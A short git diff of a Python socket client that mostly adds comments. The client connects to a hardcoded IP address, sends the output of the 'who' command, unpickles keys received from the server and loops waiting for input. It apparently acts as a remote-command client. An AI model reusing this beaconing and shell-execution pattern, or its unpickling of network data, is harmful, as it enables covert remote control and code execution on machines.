@@ -10,7 +10,7 @@ from Crypto.Cipher import AES
 #TODO
 #https://stackoverflow.com/questions/26851034/opening-a-ssl-socket-connection-in-python
 
-
+#Set variables
 HVA = '145.109.148.241'
 l = 'localhost'
 socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -65,13 +65,12 @@ def receive(socket):
 
 def main():
 
-    socket.connect(serverAddress)
-    #Standard command to identify who this machine is
-    socket.send(pickle.dumps(popenExecution("who").split()[0])) 
-    x = pickle.loads(socket.recv(2048))
-    key.append(x)
-    print(key)
+    socket.connect(serverAddress) #Connect to server
+    socket.send(pickle.dumps(popenExecution("who").split()[0])) #Send machine name to server
+    x = pickle.loads(socket.recv(2048)) #Try and receive the keys to communicate with the server
+    key.append(x) #Append keys to list of keys
 
+    #Initiate the while loop
     while True:
         receive(socket)
 
